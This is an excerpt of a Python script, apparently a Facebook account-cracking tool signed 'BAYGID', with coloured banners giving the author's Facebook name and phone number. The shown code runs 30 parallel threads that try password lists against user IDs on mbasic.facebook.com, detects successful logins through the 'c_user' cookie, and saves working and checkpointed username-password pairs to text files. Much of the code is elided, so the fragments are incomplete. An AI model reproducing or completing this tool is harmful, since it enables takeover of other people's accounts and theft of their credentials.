...
from concurrent.futures import ThreadPoolExecutor as sarfrazBAYGID
...
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           BAYGID 

\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          BAYGID CHOWDHURY

\033[1;31m\033[1;37m WhatsApp\x1b[1;97m  : \033[1;37m           01323176125

\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             0.01
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mBAYGID_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mBAYGID_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back BAYGID Menu ")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[BAYGID] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [BAYGID-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('BAYGID_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazBAYGID(max_workers=30) as BAYGIDworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        BAYGIDworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
